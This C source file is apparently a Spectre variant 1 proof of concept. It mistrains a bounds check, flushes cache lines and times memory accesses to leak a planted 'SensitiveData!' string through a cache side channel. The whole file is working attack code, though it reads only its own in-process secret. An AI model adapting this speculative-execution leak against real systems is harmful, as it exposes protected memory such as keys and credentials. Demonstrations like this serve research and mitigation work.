#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <x86intrin.h>

#define ATTEMPTS 10000
#define TRAINING_ROUNDS 30
#define THRESHOLD 150
#define STRIDE 512

unsigned int array1_size = 16;

struct data {
    uint8_t array1[16];
    uint8_t padding[16];
    char secret[32];
};

struct data d = {
    .array1 = {
        1, 2, 3, 4, 5, 6, 7, 8,
        9, 10, 11, 12, 13, 14, 15, 16
    },
    .secret = "SensitiveData!"
};

uint8_t array2[256 * STRIDE];

volatile uint8_t temp = 0;

__attribute__((noinline))
void victim(size_t x)
{
    if (x < array1_size) {
        temp &= array2[d.array1[x] * STRIDE];
    }
}

uint64_t time_access(volatile uint8_t *addr)
{
    unsigned aux;
    uint64_t start;
    uint64_t end;

    _mm_mfence();
    _mm_lfence();

    start = __rdtscp(&aux);
    _mm_lfence();

    (void)*addr;

    _mm_lfence();
    end = __rdtscp(&aux);

    _mm_lfence();
    _mm_mfence();

    return end - start;
}

void flush_array2(void)
{
    for (int i = 0; i < 256; i++) 
    {
        _mm_clflush(&array2[i * STRIDE]);
    }

    _mm_mfence();
}

int main(void)
{
    for (int i = 0; i < 256 * STRIDE; i++) 
    {
        array2[i] = 1;
    }

    size_t malicious_x = offsetof(struct data, secret);

    printf("array1       = %p\n", (void *)d.array1);
    printf("secret       = %p\n", (void *)d.secret);
    printf("array2       = %p\n", (void *)array2);
    printf("malicious x  = %zu\n\n", malicious_x);

    int hits[256] = {0};

    for (int attempt = 0; attempt < ATTEMPTS; attempt++) 
    {

       
        flush_array2();

        for (int training = 0; training < TRAINING_ROUNDS; training++) 
        {
            victim(training % array1_size);
        }

        flush_array2();

        _mm_clflush(&array1_size);
        _mm_mfence();

        victim(malicious_x);

        for (int i = 0; i < 256; i++) 
        {

            uint64_t t = time_access(&array2[i * STRIDE]);

            if (t < THRESHOLD) hits[i]++;
        }
    }

    printf("Cache hits after %d attempts:\n\n", ATTEMPTS);

    for (int i = 0; i < 256; i++) 
    {
        if (hits[i] > 0) 
        {
            printf("value %d ('%c') : %d hits\n",i,(i >= 32 && i <= 126) ? i : '.',hits[i]);
        }
    }

    return 0;
}